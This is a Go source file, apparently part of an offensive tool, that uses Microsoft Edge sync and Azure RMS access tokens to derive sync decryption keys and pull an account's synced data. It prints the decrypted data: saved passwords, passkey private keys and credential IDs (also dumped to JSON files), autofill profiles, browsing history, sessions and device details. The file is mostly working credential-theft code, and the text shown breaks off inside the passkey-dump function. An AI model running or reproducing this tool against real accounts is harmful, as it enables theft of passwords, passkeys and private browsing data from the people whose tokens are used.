package sync

import (
	"synchole/syncproto"
	"bytes"
	"crypto/sha1"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"regexp"
	"strconv"
	"strings"
	"time"

	"google.golang.org/protobuf/encoding/protowire"
	"google.golang.org/protobuf/proto"
)

const SYNC_TYPE_PASSWORDS = 45873
const SYNC_TYPE_BOOKMARKS = 32904
const SYNC_TYPE_PREFERENCE = 37702
const SYNC_TYPE_EXTENSIONS = 48119
const SYNC_TYPE_EXTENSION_SETTINGS = 96159
const SYNC_TYPE_DEVICE = 154522
const SYNC_TYPE_HISTORY = 963985

type SyncClient struct {
	Debug          bool
	MsEdgeToken    string
	AADRmsToken    string
	Deriviationkey string
	Mackey         []byte
	Decryptionkey  []byte
	EnumSyncCodes  []int32
}

func (s *SyncClient) Init() error {
	if s.MsEdgeToken == "" {
		return errors.New("MsEdgeToken must be provided")
	}
	if s.Deriviationkey == "" {
		if s.AADRmsToken == "" {
			return errors.New("AADRmsToken must be provided when deriviation key is not set")
		}
		fmt.Println("[*] Getting Serialized Publishing License and Data")
		licensesandData, err := GetSerializedPublishingLicenseAndData(s.MsEdgeToken)
		if err != nil {
			return err
		}

		fmt.Println("[+] Got Serialized Publishing License and Data")
		fmt.Println("[*] Requesting Decryption Keys")

		deriviationKey, err := GetDeriviationKeyFromPublishingLicenses(licensesandData, s.AADRmsToken)
		if err != nil {
			return err
		}
		if Silent {
			fmt.Println("[+] Obtained Deriviation Key")
		} else {
			fmt.Println("[+] Obtained Deriviation Key: " + deriviationKey)
		}
		s.Deriviationkey = deriviationKey
	}
	return nil
}

func (s *SyncClient) Create() {
	err := s.Init()
	if err != nil {
		fmt.Println(err)
		return
	}
	s.Decryptionkey = GetDecryptionKeyFromDeriviationKey(s.Deriviationkey)
	s.Mackey = GetMacKeyFromDeriviationKey(s.Deriviationkey)

}

func (s *SyncClient) Enum() {
	if s.MsEdgeToken == "" {
		fmt.Println("[-] MsEdgeToken must be provided")
		return
	}
	if s.Deriviationkey == "" {
		if s.AADRmsToken == "" {
			fmt.Println("[-] AADRmsToken must be provided when deriviation key is not set")
			return
		}
		fmt.Println("[*] Getting Serialized Publishing License and Data")
		licensesandData, err := GetSerializedPublishingLicenseAndData(s.MsEdgeToken)
		if err != nil {
			fmt.Println(err)
			return
		}

		fmt.Println("[+] Got Serialized Publishing License and Data")
		fmt.Println("[*] Requesting Decryption Keys")

		deriviationKey, err := GetDeriviationKeyFromPublishingLicenses(licensesandData, s.AADRmsToken)
		if err != nil {
			fmt.Println(err)
			return
		}
		if Silent {
			fmt.Println("[+] Obtained Deriviation Key")
		} else {
			fmt.Println("[+] Obtained Deriviation Key: " + deriviationKey)
		}
		s.Deriviationkey = deriviationKey
	}
	s.Decryptionkey = GetDecryptionKeyFromDeriviationKey(s.Deriviationkey)
	s.Mackey = GetMacKeyFromDeriviationKey(s.Deriviationkey)
	_, err := RandomSyncRequest(s.MsEdgeToken, s.Decryptionkey, s.EnumSyncCodes)
	if err != nil {
		fmt.Println(err)
		return
	}
}

type SerializedPublishingLicenseAndData struct {
	SerializedPublishingLicense string `json:"License"`
	Data                        string `json:"Data"`
}

func GetSerializedPublishingLicenseAndData(msedgetoken string) ([]SerializedPublishingLicenseAndData, error) {

	msg := &syncproto.RootMessage{

		UnknownStatic1: 99,
		UnknownStatic2: 2,
		Field5: &syncproto.SubMessage5{

			Field6: []*syncproto.Field6{&syncproto.Field6{Field1: 47745}},
			Field8: 2,

		},

	}
	data, err := proto.Marshal(msg)
	if err != nil {
		return []SerializedPublishingLicenseAndData{}, err
	}
	DebugPrint("[*] Start Raw Publishing License Request")
	ArbitiaryProtoBufParser(data, 0)
	DebugPrint("[*] Done Raw Publishing License Request")
	b := GzipEncode(data)
	out, err := DoSyncHTTPRequest(b, "https://edge.microsoft.com/sync/v1/feeds/me/syncEntities/command", msedgetoken)
	if err != nil {
		return []SerializedPublishingLicenseAndData{}, err
	}

	if os.Getenv("DUMP_PL") != "" {
		os.WriteFile("serializedPublishingResponse.bin", out, 0755)
	}

	DebugPrint("[*] Start Raw Publishing License Response")
	ArbitiaryProtoBufParser(out, 0)
	DebugPrint("[+] Done Raw Publishing License Response")
	var msgresp syncproto.SerializedPublishingLicenseResponse

	err = proto.Unmarshal(out, &msgresp)
	if err != nil {
		return []SerializedPublishingLicenseAndData{}, err
	}

	if msgresp.Field2 == nil {
		return []SerializedPublishingLicenseAndData{}, errors.New("Unable to parse sync request response: \n" + string(out))
	}
	if msgresp.Field2.Field8 == nil {
		return []SerializedPublishingLicenseAndData{}, errors.New("Unable to parse sync request response: \n" + string(out))
	}

	licenses := []SerializedPublishingLicenseAndData{}
	for _, raw := range []string{msgresp.Field2.Field8.Json1, msgresp.Field2.Field8.Json4} {
		if strings.TrimSpace(raw) == "" {
			continue
		}
		var lic SerializedPublishingLicenseAndData
		if err := json.Unmarshal([]byte(raw), &lic); err != nil {
			DebugPrint("[-] Skipping unparsable publishing-license JSON: " + err.Error())
			continue
		}
		licenses = append(licenses, lic)
	}
	if len(licenses) == 0 {
		return []SerializedPublishingLicenseAndData{}, errors.New("no publishing license JSON found in response (json1 and json4 both empty/unparsable): \n" + string(out))
	}
	return licenses, nil
}

type SerializedPublishingLicense struct {
	SerializedPublishingLicense string
}

type NewKeyResponse struct {
	CreationTime float64 `json:"creation_time"`
	NewKey       string  `json:"new_key"`
}

var newKeyPattern = regexp.MustCompile(`"new_key"\s*:\s*"([^"]*)"`)

func ParseNewKeyResponse(plaintext string) (string, error) {
	var nkr NewKeyResponse
	err := json.Unmarshal([]byte(plaintext), &nkr)
	if err == nil {
		if nkr.NewKey == "" {
			return "", errors.New("publishing license payload parsed as JSON but carried no new_key")
		}
		return nkr.NewKey, nil
	}
	DebugPrint("[-] Publishing license payload did not parse as JSON (" + err.Error() +
		"); falling back to pattern match")
	if m := newKeyPattern.FindStringSubmatch(plaintext); m != nil && m[1] != "" {
		return m[1], nil
	}
	return "", errors.New("no new_key found in decrypted publishing license payload")
}

func GetDeriviationKeyFromPublishingLicenses(licenses []SerializedPublishingLicenseAndData, AADRmsToken string) (string, error) {
	for i := 0; i < len(licenses); i++ {
		DebugPrint("[*] Using Serialized License: " + licenses[i].SerializedPublishingLicense)
		DebugPrint("[*] Using Data: " + licenses[i].Data)
		key, err := GetKeyFromSerializedPublishingLicense(licenses[i].SerializedPublishingLicense, AADRmsToken)
		if err != nil {
			fmt.Println(err)
			continue
		}
		DebugPrint("[+] Obtained Use License Key: " + key)
		pt, err := DecryptCBC4k(key, licenses[i].Data)
		if err != nil {
			fmt.Println(err)
			continue
		}
		DebugPrint("[*] Decrypted Publishing license Data: " + pt)
		newkey, err := ParseNewKeyResponse(pt)
		if err != nil {
			fmt.Println(err)
			continue
		}
		return newkey, nil
	}
	return "", errors.New("Could not get deriviation key from publishing licenses")
}

func GetKeyFromSerializedPublishingLicense(serializedPublishingLicense string, aadrmsAccessToken string) (string, error) {
	spl := SerializedPublishingLicense{
		SerializedPublishingLicense: serializedPublishingLicense,
	}
	req, err := json.Marshal(spl)
	if err != nil {
		return "", err
	}
	resp, err := DoUseLicenseHTTPRequest(req, "https://api.aadrm.com/my/v2/enduserlicenses", aadrmsAccessToken)
	if err != nil {
		return "", err
	}

	var ulr UseLicenseResponse
	err = json.Unmarshal(resp, &ulr)
	if err != nil {
		return "", err
	}
	return ulr.Key.Value, nil
}

type UseLicenseResponse struct {
	ID           string `json:"Id"`
	Name         string `json:"Name"`
	Description  string `json:"Description"`
	Referrer     any    `json:"Referrer"`
	Owner        string `json:"Owner"`
	AccessStatus string `json:"AccessStatus"`
	Key          struct {
		Value      string `json:"Value"`
		CipherMode string `json:"CipherMode"`
		Algorithm  string `json:"Algorithm"`
		Size       int    `json:"Size"`
	} `json:"Key"`
	Rights                   []string `json:"Rights"`
	Roles                    any      `json:"Roles"`
	IssuedTo                 string   `json:"IssuedTo"`
	ContentValidUntil        string   `json:"ContentValidUntil"`
	LicenseValidUntil        string   `json:"LicenseValidUntil"`
	ContentID                string   `json:"ContentId"`
	DocumentID               string   `json:"DocumentId"`
	LabelID                  string   `json:"LabelId"`
	DynamicWatermark         any      `json:"DynamicWatermark"`
	OnlineAccessOnly         bool     `json:"OnlineAccessOnly"`
	SignedApplicationData    any      `json:"SignedApplicationData"`
	EncryptedApplicationData any      `json:"EncryptedApplicationData"`
	FromTemplate             bool     `json:"FromTemplate"`
	Policy                   struct {
		AllowAuditedExtraction bool `json:"AllowAuditedExtraction"`
		UserRights             []struct {
			Users  []string `json:"Users"`
			Rights []string `json:"Rights"`
		} `json:"UserRights"`
		UserRoles          any    `json:"UserRoles"`
		IntervalTimeInDays int    `json:"IntervalTimeInDays"`
		LicenseValidUntil  string `json:"LicenseValidUntil"`
	} `json:"Policy"`
	ErrorMessage      any `json:"ErrorMessage"`
	ExtendedErrorInfo any `json:"ExtendedErrorInfo"`
}

func SyncRequest(m proto.Message, msedgetoken string) ([]byte, error) {
	data, err := proto.Marshal(m)
	if err != nil {
		return []byte{}, err
	}
	DebugPrint("[*] Start Raw Sync Request")
	ArbitiaryProtoBufParser(data, 0)
	DebugPrint("[*] Done Raw Sync Request")
	b := GzipEncode(data)
	out, err := DoSyncHTTPRequest(b, "https://edge.microsoft.com/sync/v1/feeds/me/syncEntities/command", msedgetoken)
	if err != nil {
		return []byte{}, err
	}
	DebugPrint("[*] Start Raw Sync Response")
	ArbitiaryProtoBufParser(out, 0)
	DebugPrint("[+] Done Raw Sync Response")
	return out, nil
}

func ParseSyncResponse(msg syncproto.SyncResponse, key []byte) ([]string, []string, error) {
	var outerrors []string
	var outplaintext []string
	if msg.NestedProtoField2 != nil {
		if msg.NestedProtoField2.Entries != nil {
			numentriesstr := strconv.Itoa(len(msg.NestedProtoField2.Entries))
			DebugPrint("Number of Entries (Field 2): " + numentriesstr)
			pt, errs := ParseEntries(msg.NestedProtoField2.Entries, key)
			outplaintext = append(outplaintext, pt...)
			outerrors = append(outerrors, errs...)
		}
	}

	if msg.Entries != nil {
		numentriesstr := strconv.Itoa(len(msg.Entries))
		DebugPrint("Number of Entries (Field 1): " + numentriesstr)
		pt, errs := ParseEntries(msg.Entries, key)
		outplaintext = append(outplaintext, pt...)
		outerrors = append(outerrors, errs...)
	}

	return outplaintext, outerrors, nil
}

var EntryCounter int

func ParseEntries(entries []*syncproto.Entry, key []byte) ([]string, []string) {
	var outerrors []string
	var outplaintext []string

	for i := 0; i < len(entries); i++ {
		if strings.Compare(string(entries[i].HostnameOrEncrypted), "encrypted") == 0 {

			var encdatamsg syncproto.EncryptedProto
			if entries[i].Data[0] == 10 {
				err := proto.Unmarshal(entries[i].Data, &encdatamsg)
				if err != nil {
					DebugPrint(err.Error())
					continue
				}
			} else {

				err := proto.Unmarshal(entries[i].Data[5:], &encdatamsg)

				if err != nil {
					DebugPrint(err.Error())
					continue
				}
			}

			if encdatamsg.EncryptedData != nil {
				pt, err := DecryptSyncData(string(encdatamsg.EncryptedData.CipherText), key)
				if err != nil {

					outerrors = append(outerrors, err.Error())
				} else {

					outplaintext = append(outplaintext, pt)

					ParseDataMessage(entries[i], []byte(pt))
					DebugPrint("[*] Decrypted: " + pt)
				}
			} else {
				DebugPrint("[-] PARSING ERROR: " + string(entries[i].HostnameOrEncrypted) + " " + string(entries[i].Data))
				continue

			}

		} else {

			if len(entries[i].Data) > 5 {
				var unencdatamsg syncproto.UnencryptedData

				err := proto.Unmarshal(entries[i].Data, &unencdatamsg)
				if err != nil {
					DebugPrint(err.Error())
					continue
				}
				if string(unencdatamsg.Data) == "" {
					fmt.Println("[*] Arbitiary Unencrypted Data: ")
					ParseDataMessage(entries[i], []byte{})

				} else {
					DebugPrint("[*] Unencrypted: " + string(unencdatamsg.Data))
				}

			} else {
				DebugPrint("[*] Unencrypted Random Data: " + string(entries[i].Data))
				fmt.Println(entries[i].Data)
			}

		}
	}
	return outplaintext, outerrors
}

func PasswordSyncRequest(msedgetoken string, key []byte) ([]string, error) {
	m := NewPasswordSyncMessage()

	out, err := SyncRequest(m, msedgetoken)
	if err != nil {
		return []string{}, err
	}

	var msgresp syncproto.SyncResponse

	err = proto.Unmarshal(out, &msgresp)
	if err != nil {
		return []string{}, err
	}
	plaintext, errors, err := ParseSyncResponse(msgresp, key)
	if err != nil {
		return []string{}, err
	}
	fmt.Println("[+] Got Plaintext Content")
	for i := 0; i < len(plaintext); i++ {

	}
	for i := 0; i < len(errors); i++ {
		strnum := strconv.Itoa(i)
		fmt.Println("[*] Error " + strnum + ": ")
		fmt.Println(errors[i])
	}
	PasswordSyncResults := []string{}
	return PasswordSyncResults, nil
}

func NewPasswordSyncMessage() proto.Message {
	msg := &syncproto.RootMessage{

		UnknownStatic2: 2,
		Field5: &syncproto.SubMessage5{

			Field6: []*syncproto.Field6{

				&syncproto.Field6{Field1: 45873},

			},

		},

	}
	return msg
}

func BookmarksSyncRequest(msedgetoken string, key []byte) ([]string, error) {
	m := NewBookmarksSyncMessage()
	out, err := SyncRequest(m, msedgetoken)
	if err != nil {
		return []string{}, err
	}
	var bookmarkresp syncproto.SyncResponse
	err = proto.Unmarshal(out, &bookmarkresp)
	if err != nil {
		return []string{}, err
	}
	DebugPrint("[*] Parsing for Secrets")
	plaintext, errors, err := ParseSyncResponse(bookmarkresp, key)
	if err != nil {
		return []string{}, err
	}
	fmt.Println("[+] Got Plaintext Content")
	for i := 0; i < len(plaintext); i++ {

		var sb syncproto.SyncBookmark

		err = proto.Unmarshal([]byte(plaintext[i]), &sb)
		if err != nil {
			DebugPrint(err.Error())
			continue
		}
		fmt.Println("[+] New Bookmark Recoverd")
		fmt.Println("Name: " + string(sb.Bookmark.Name))
		fmt.Println("URL: " + string(sb.Bookmark.Url))
		fmt.Println()
	}
	for i := 0; i < len(errors); i++ {
		strnum := strconv.Itoa(i)
		fmt.Println("[*] Error " + strnum + ": ")
		fmt.Println(errors[i])
	}
	PasswordSyncResults := []string{}
	return PasswordSyncResults, nil
}

func NewBookmarksSyncMessage() proto.Message {
	msg := &syncproto.RootMessage{
		UnknownStatic2: 2,
		Field5: &syncproto.SubMessage5{
			Field6: []*syncproto.Field6{
				&syncproto.Field6{Field1: 32904},
			},
		},
	}
	return msg
}

func RandomSyncRequest(msedgetoken string, key []byte, edgecodes []int32) ([]string, error) {
	DebugPrint("[*] Parsing for Secrets")

	if err := paginatedRead(msedgetoken, key, edgecodes); err != nil {
		return []string{}, err
	}
	return []string{}, nil
}

func RandomSyncRequestPerType(msedgetoken string, key []byte, edgecodes []int32) error {
	for _, c := range edgecodes {

		if err := paginatedRead(msedgetoken, key, []int32{c}); err != nil {
			fmt.Printf("[-] %s (%d): %v\n", DataTypeName(uint64(c)), c, err)
		}
	}
	return nil
}

func NewRandomSyncMessage(edgecodes []int32) proto.Message {
	return NewRandomSyncMessageWithTokens(edgecodes, nil)
}

func NewRandomSyncMessageWithTokens(edgecodes []int32, tokens map[int32][]byte) proto.Message {
	itemstorequest := []*syncproto.Field6{}
	for i := 0; i < len(edgecodes); i++ {
		f := &syncproto.Field6{Field1: edgecodes[i]}
		if tokens != nil {
			if t, ok := tokens[edgecodes[i]]; ok && len(t) > 0 {
				f.Field2 = t
			}
		}
		itemstorequest = append(itemstorequest, f)
	}
	msg := &syncproto.RootMessage{
		UnknownStatic2: 2,
		Field5: &syncproto.SubMessage5{
			Field6:    itemstorequest,
			Field3:    1,
			Field9:    9,
			Field1000: 1,
		},
	}
	return msg
}

func extractProgress(resp *syncproto.SyncResponse) (remaining int64, tokens map[int32][]byte) {
	tokens = map[int32][]byte{}
	np := resp.NestedProtoField2
	if np == nil {
		return 0, tokens
	}
	remaining = np.Field4
	for _, pm := range np.Field5 {
		var f syncproto.Field6
		if err := proto.Unmarshal(pm, &f); err == nil && f.Field1 != 0 {
			tokens[f.Field1] = f.Field2
		}
	}
	return remaining, tokens
}

func paginatedRead(msedgetoken string, key []byte, edgecodes []int32) error {
	tokens := map[int32][]byte{}
	const maxRounds = 1000
	for round := 0; round < maxRounds; round++ {
		m := NewRandomSyncMessageWithTokens(edgecodes, tokens)
		out, err := SyncRequest(m, msedgetoken)
		if err != nil {
			return err
		}
		if bytes.Contains(out, []byte("Server Returned Unknown Error")) {
			if round == 0 && len(edgecodes) == 1 {
				fmt.Printf("[-] %s (%d): not supported by server — skipped\n", DataTypeName(uint64(edgecodes[0])), edgecodes[0])
			}
			return nil
		}
		var resp syncproto.SyncResponse
		if err := proto.Unmarshal(out, &resp); err != nil {
			return err
		}
		if _, errs, perr := ParseSyncResponse(resp, key); perr == nil {
			for _, e := range errs {
				DebugPrint("[*] decrypt error: " + e)
			}
		}
		remaining, newTokens := extractProgress(&resp)
		advanced := false
		for k, v := range newTokens {
			if !bytes.Equal(tokens[k], v) {
				advanced = true
			}
			tokens[k] = v
		}
		DebugPrint(fmt.Sprintf("[*] page %d: changes_remaining=%d", round, remaining))
		if remaining <= 0 || !advanced {
			break
		}
	}
	return nil
}

func ParseDataMessage(entry *syncproto.Entry, decrypteddata []byte) {

	var data []byte
	if strings.Compare(string(entry.HostnameOrEncrypted), "encrypted") == 0 {
		data = append(data, decrypteddata...)
		ArbitiaryProtoBufParser(entry.Data, 0)
	} else {
		data = append(data, entry.Data...)
	}
	if Debug {
		entrydata, err := proto.Marshal(entry)
		if err != nil {
			fmt.Println(err)
		}
		ArbitiaryProtoBufParser(entrydata, 0)
	}

	EntryCounter = EntryCounter + 1

	DebugPrint("[*] Entry Information")
	DebugPrint("ID STRING: " + string(entry.Idstring))
	DebugPrint("CLIENT TAG HASH: " + string(entry.ClientTagHash))
	strversion := strconv.Itoa(int(*entry.Version))
	DebugPrint("VERSION: " + strversion)
	fmt.Println("[*] Entry Information (ID: " + string(entry.Idstring) + " CTH: " + string(entry.ClientTagHash) + " VERSION: " + strversion + ")")
	if os.Getenv("DUMP_SPECIFICS") != "" {
		os.WriteFile("specifics_"+strconv.FormatUint(getField1(data), 10)+"_"+strconv.Itoa(EntryCounter)+".bin", data, 0644)
	}
	switch getField1(data) {
	case 963985:
		var sh syncproto.SyncHistory
		err := proto.Unmarshal(data, &sh)
		if err != nil {
			DebugPrint(err.Error())
			return
		}
		fmt.Println("[+] New History Recoverd")

		if sh.History != nil {
			if sh.History.Urlinfo != nil {
				fmt.Println("URL: " + string(sh.History.Urlinfo.Url))

				fmt.Println("TIME STAMPS")

				fmt.Println(ParseTimeStamp(int64(*entry.Ctime)))

			}
		}

	case 1:
		var sp syncproto.SyncPassword

		err := proto.Unmarshal(data, &sp)
		if err != nil {
			DebugPrint(err.Error())
			return
		}
		fmt.Println("[+] New Password Entry Found")
		fmt.Println("URL: " + sp.Urlwithpath)
		fmt.Println("Username: " + sp.Username)
		fmt.Println("Password: " + sp.Password)
		fmt.Println()

	case SYNC_TYPE_PREFERENCE:
		var sp syncproto.SyncPreference
		err := proto.Unmarshal(data, &sp)
		if err != nil {
			DebugPrint(err.Error())
			return
		}
		fmt.Println("[+] New Preference Entry Found")
		fmt.Println(string(sp.Preference.Name) + ":" + string(sp.Preference.Value))
		fmt.Println()
	case SYNC_TYPE_EXTENSIONS:
		var sp syncproto.SyncExtension
		err := proto.Unmarshal(data, &sp)
		if err != nil {
			DebugPrint(err.Error())
			return
		}
		fmt.Println("[+] New Extension Entry Found")
		var enabled string
		if *sp.Extension.Enabled {
			enabled = "true"
		} else {
			enabled = "false"
		}
		fmt.Println("Enabled: " + enabled)
		fmt.Println("ID: " + string(sp.Extension.ExtensionId))
		fmt.Println("UpdateURL: " + string(sp.Extension.UpdateUrl))
		fmt.Println("Version: " + string(sp.Extension.Version))
		fmt.Println()
	case SYNC_TYPE_EXTENSION_SETTINGS:
		var sp syncproto.SyncExtensionSetting
		err := proto.Unmarshal(data, &sp)
		if err != nil {
			DebugPrint(err.Error())
			return
		}
		fmt.Println("[+] New Extension Setting Entry Found")
		fmt.Println("Extension ID: " + string(sp.Extensionsetting.ExtensionID))
		fmt.Println("Variable Name: " + string(sp.Extensionsetting.VarName))
		fmt.Println("Variable Value: " + string(sp.Extensionsetting.VarValue))
		fmt.Println()
	case SYNC_TYPE_BOOKMARKS:
		var sb syncproto.SyncBookmark
		err := proto.Unmarshal(data, &sb)
		if err != nil {
			DebugPrint(err.Error())
			return
		}
		fmt.Println("[+] New Bookmark Entry Found")
		if sb.Bookmark != nil {
			fmt.Println("Name: " + string(sb.Bookmark.Name))
			fmt.Println("URL: " + string(sb.Bookmark.Url))
		}
		fmt.Println()
	case SYNC_TYPE_SEND_TAB_TO_SELF:
		var s syncproto.SyncSendTabToSelf
		if err := proto.Unmarshal(data, &s); err != nil {
			DebugPrint(err.Error())
			return
		}
		fmt.Println("[+] New SendTabToSelf Entry Found")
		if t := s.SendTabToSelf; t != nil {
			fmt.Println("Title: " + string(t.Title))
			fmt.Println("URL: " + string(t.Url))
			fmt.Println("Target Device: " + string(t.DeviceName))
			fmt.Println("Target Device GUID: " + string(t.TargetDeviceSyncCacheGuid))
			fmt.Printf("Notification dismissed: %v  Opened: %v\n", t.NotificationDismissed, t.Opened)
		}
		fmt.Println()
	case SYNC_TYPE_DEVICE:
		var s syncproto.SyncDeviceInfo
		if err := proto.Unmarshal(data, &s); err != nil {
			DebugPrint(err.Error())
			return
		}
		fmt.Println("[+] New DeviceInfo Entry Found")
		if d := s.DeviceInfo; d != nil {
			fmt.Println("CacheGUID: " + string(d.CacheGuid))
			fmt.Println("Name: " + string(d.ClientName))
			fmt.Println("Manufacturer: " + string(d.Manufacturer))
			fmt.Println("Model: " + string(d.Model))
			fmt.Println("OS Type: " + OsTypeName(d.OsType))
			fmt.Println("Sync User Agent: " + string(d.SyncUserAgent))
			if st := d.SyncedTypes; st != nil && len(st.DataType) > 0 {
				fmt.Println("Synced Data Types:")
				for _, dt := range st.DataType {
					fmt.Printf("  - %s (%d)\n", DataTypeName(uint64(dt)), dt)
				}
			}
		}
		fmt.Println()
	case SYNC_TYPE_WEB_APP:
		var s syncproto.SyncWebApp
		if err := proto.Unmarshal(data, &s); err != nil {
			DebugPrint(err.Error())
			return
		}
		fmt.Println("[+] New WebApp Entry Found")
		if s.WebApp != nil {
			fmt.Println("Name: " + string(s.WebApp.Name))
			fmt.Println("StartURL: " + string(s.WebApp.StartUrl))
		}
		fmt.Println()
	case SYNC_TYPE_WEBAUTHN_CREDENTIAL:
		var s syncproto.SyncWebauthnCredential
		if err := proto.Unmarshal(data, &s); err != nil {
			DebugPrint(err.Error())
			return
		}
		fmt.Println("[+] New WebAuthn Credential (passkey) Entry Found")
		if w := s.WebauthnCredential; w != nil {
			fmt.Println("RP ID: " + string(w.RpId))
			fmt.Println("User: " + string(w.UserName))
			fmt.Println("Display Name: " + string(w.UserDisplayName))
			fmt.Println("User ID (b64): " + base64.StdEncoding.EncodeToString(w.UserId))
			fmt.Println("Credential ID (b64): " + base64.StdEncoding.EncodeToString(w.CredentialId))
			if len(w.Encrypted) > 0 {
				fmt.Printf("Encrypted secret (%d bytes, b64): %s\n",
					len(w.Encrypted), base64.StdEncoding.EncodeToString(w.Encrypted))
			}
			if len(w.PrivateKey) > 0 {
				fmt.Printf("Unencrypted private key (%d bytes, b64): %s\n",
					len(w.PrivateKey), base64.StdEncoding.EncodeToString(w.PrivateKey))
			}
			if filename, err := DumpWebauthnCredential(w); err != nil {
				fmt.Println("[-] Failed to write passkey JSON: " + err.Error())
			} else {
				fmt.Println("[+] Wrote passkey details to " + filename)
			}
		}
		fmt.Println()
	case SYNC_TYPE_AUTOFILL:
		var s syncproto.SyncAutofill
		if err := proto.Unmarshal(data, &s); err != nil {
			DebugPrint(err.Error())
			return
		}
		fmt.Println("[+] New Autofill Entry Found")
		if s.Autofill != nil {
			fmt.Println("Field: " + string(s.Autofill.Name))
			fmt.Println("Value: " + string(s.Autofill.Value))
		}
		fmt.Println()
	case SYNC_TYPE_AUTOFILL_PROFILE:
		var s syncproto.SyncAutofillProfile
		if err := proto.Unmarshal(data, &s); err != nil {
			DebugPrint(err.Error())
			return
		}
		fmt.Println("[+] New Autofill Profile Entry Found")
		if p := s.AutofillProfile; p != nil {
			fmt.Println("GUID: " + string(p.Guid))
			if len(p.NameFull) > 0 {
				fmt.Println("Name: " + string(p.NameFull[0]))
			}
			if len(p.EmailAddress) > 0 {
				fmt.Println("Email: " + string(p.EmailAddress[0]))
			}
			fmt.Println("City: " + string(p.AddressHomeCity))
		}
		fmt.Println()
	case SYNC_TYPE_SAVED_TAB_GROUP:
		var s syncproto.SyncSavedTabGroup
		if err := proto.Unmarshal(data, &s); err != nil {
			DebugPrint(err.Error())
			return
		}
		fmt.Println("[+] New SavedTabGroup Entry Found")
		if g := s.SavedTabGroup; g != nil {
			fmt.Println("GUID: " + string(g.Guid))
			if g.Group != nil {
				fmt.Println("Group Title: " + string(g.Group.Title))
			}
			if g.Tab != nil {
				fmt.Println("Tab URL: " + string(g.Tab.Url))
				fmt.Println("Tab Title: " + string(g.Tab.Title))
			}
		}
		fmt.Println()
	case SYNC_TYPE_SESSION:
		var s syncproto.SyncSession
		if err := proto.Unmarshal(data, &s); err != nil {
			DebugPrint(err.Error())
			return
		}
		fmt.Println("[+] New Session Entry Found")
		if sess := s.Session; sess != nil {

			fmt.Println("Device (cache GUID / session tag): " + string(sess.SessionTag))
			if sess.Header != nil {
				fmt.Println("Device Name: " + string(sess.Header.ClientName))
			}
			if sess.Tab != nil {
				for _, nav := range sess.Tab.Navigation {
					fmt.Println("Tab URL: " + string(nav.VirtualUrl) + " (" + string(nav.Title) + ")")
				}
			}
		}
		fmt.Println()
	case SYNC_TYPE_USER_CONSENT:
		var s syncproto.SyncUserConsent
		if err := proto.Unmarshal(data, &s); err != nil {
			DebugPrint(err.Error())
			return
		}
		fmt.Println("[+] New UserConsent Entry Found")
		if s.UserConsent != nil {
			fmt.Println("Account (OID): " + string(s.UserConsent.AccountId))
			if s.UserConsent.ClientConsentTimeUsec != 0 {
				fmt.Printf("Consent time (usec): %d\n", s.UserConsent.ClientConsentTimeUsec)
			}
		}
		fmt.Println()
	case SYNC_TYPE_HISTORY_DELETE_DIRECTIVE:
		var s syncproto.SyncHistoryDeleteDirective
		if err := proto.Unmarshal(data, &s); err != nil {
			DebugPrint(err.Error())
			return
		}
		fmt.Println("[+] New HistoryDeleteDirective Entry Found")
		if d := s.HistoryDeleteDirective; d != nil {
			if d.UrlDirective != nil {
				fmt.Println("Delete URL: " + string(d.UrlDirective.Url))
			}
			if d.TimeRangeDirective != nil {
				fmt.Printf("Delete range: %d - %d\n", d.TimeRangeDirective.StartTimeUsec, d.TimeRangeDirective.EndTimeUsec)
			}
			if d.GlobalIdDirective != nil {
				fmt.Printf("Delete %d global ids\n", len(d.GlobalIdDirective.GlobalId))
			}
		}
		fmt.Println()
	case SYNC_TYPE_NIGORI:
		var s syncproto.SyncNigori
		if err := proto.Unmarshal(data, &s); err != nil {
			DebugPrint(err.Error())
			return
		}
		fmt.Println("[+] New Nigori (crypto state) Entry Found")
		if n := s.Nigori; n != nil {
			fmt.Printf("EncryptEverything: %v  KeybagFrozen: %v  PassphraseType: %d\n",
				n.EncryptEverything, n.KeybagIsFrozen, n.PassphraseType)
			if n.EncryptionKeybag != nil {
				fmt.Println("Keybag KeyName: " + string(n.EncryptionKeybag.KeyName))
			}
		}
		fmt.Println()
	case SYNC_TYPE_EDGE_E_DROP:
		var s syncproto.SyncEdgeEDrop
		if err := proto.Unmarshal(data, &s); err != nil {
			DebugPrint(err.Error())
			return
		}
		fmt.Println("[+] New Edge E-Drop Entry Found (schema best-effort — verify layout)")
		if e := s.EdgeEDrop; e != nil {
			fmt.Println("Title: " + string(e.Title))
			fmt.Println("ContentType: " + string(e.ContentType))
		}

		dbg := Debug
		Debug = true
		ArbitiaryProtoBufParser(data, 0)
		Debug = dbg
		fmt.Println()
	default:
		{
			field := getField1(data)
			fmt.Printf("[+] New %s Entry Found (data type id: %d) — no typed parser yet, dumping fields:\n", DataTypeName(field), field)
			if !Debug {
				Debug = true
				ArbitiaryProtoBufParser(data, 0)
				Debug = false
			} else {
				ArbitiaryProtoBufParser(data, 0)
			}

		}
	}
}

type WebauthnCredentialDump struct {
	SyncID            string `json:"sync_id"`
	CredentialID      string `json:"credential_id"`
	RpID              string `json:"rp_id"`
	UserID            string `json:"user_id"`
	UserName          string `json:"user_name"`
	UserDisplayName   string `json:"user_display_name"`
	CreationTime      int64  `json:"creation_time"`
	CreationTimeUTC   string `json:"creation_time_utc,omitempty"`
	KeyVersion        int32  `json:"key_version"`
	PrivateKey        string `json:"private_key,omitempty"`
	Encrypted         string `json:"encrypted,omitempty"`
	EncryptedByteSize int    `json:"encrypted_byte_size,omitempty"`
}

func sanitizeFilePart(in string) string {
	var b strings.Builder
	for _, r := range in {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9',
			r == '.', r == '-', r == '@':
			b.WriteRune(r)
		default:
			b.WriteRune('_')
		}
	}
	out := strings.Trim(b.String(), "_")
	if out == "" {
		return "unknown"
	}
	if len(out) > 96 {
		out = out[:96]
	}
	return out
}

func DumpWebauthnCredential(w *syncproto.WebauthnCredentialSpecifics) (string, error) {
	if w == nil {
		return "", errors.New("nil webauthn credential")
	}

	entry := WebauthnCredentialDump{
		SyncID:          base64.StdEncoding.EncodeToString(w.SyncId),
		CredentialID:    base64.StdEncoding.EncodeToString(w.CredentialId),
		RpID:            string(w.RpId),
		UserID:          base64.StdEncoding.EncodeToString(w.UserId),
		UserName:        string(w.UserName),
		UserDisplayName: string(w.UserDisplayName),
		CreationTime:    w.CreationTime,
		KeyVersion:      w.KeyVersion,
	}
	if w.CreationTime > 0 {

